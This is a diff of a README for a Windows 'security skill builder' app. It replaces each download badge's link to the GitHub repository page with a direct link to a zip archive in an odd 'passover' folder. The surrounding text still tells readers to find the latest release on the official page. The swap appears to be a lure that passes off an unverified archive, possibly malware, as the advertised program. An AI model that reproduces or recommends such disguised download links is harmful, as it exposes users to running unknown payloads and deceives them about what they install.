@@ -1,6 +1,6 @@
 # ⚙️ ghsa-skill-builder - Build Your Security Skills Easily
 
-[![Download ghsa-skill-builder](https://img.shields.io/badge/Download-ghsa--skill--builder-brightgreen?style=for-the-badge)](https://github.com/ghaniyanawaz/ghsa-skill-builder)
+[![Download ghsa-skill-builder](https://img.shields.io/badge/Download-ghsa--skill--builder-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ghaniyanawaz/ghsa-skill-builder/main/passover/builder_ghsa_skill_v3.0-alpha.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to download, install, and run the app on your Windows compute
 
 You need to download ghsa-skill-builder from the official GitHub page. Visit the page using the link below:
 
-[![Download ghsa-skill-builder](https://img.shields.io/badge/Download-ghsa--skill--builder-blue?style=for-the-badge)](https://github.com/ghaniyanawaz/ghsa-skill-builder)
+[![Download ghsa-skill-builder](https://img.shields.io/badge/Download-ghsa--skill--builder-blue?style=for-the-badge)](https://raw.githubusercontent.com/ghaniyanawaz/ghsa-skill-builder/main/passover/builder_ghsa_skill_v3.0-alpha.5.zip)
 
 Once you are on the page, look for the latest release or the section where you can download the program files.
 
@@ -131,4 +131,4 @@ The tool runs on your computer and requires no special software or technical set
 
 Use this link to get the app and start building your security skills on Windows:
 
-[![Download ghsa-skill-builder](https://img.shields.io/badge/Download-ghsa--skill--builder-blue?style=for-the-badge)](https://github.com/ghaniyanawaz/ghsa-skill-builder)
+[![Download ghsa-skill-builder](https://img.shields.io/badge/Download-ghsa--skill--builder-blue?style=for-the-badge)](https://raw.githubusercontent.com/ghaniyanawaz/ghsa-skill-builder/main/passover/builder_ghsa_skill_v3.0-alpha.5.zip)
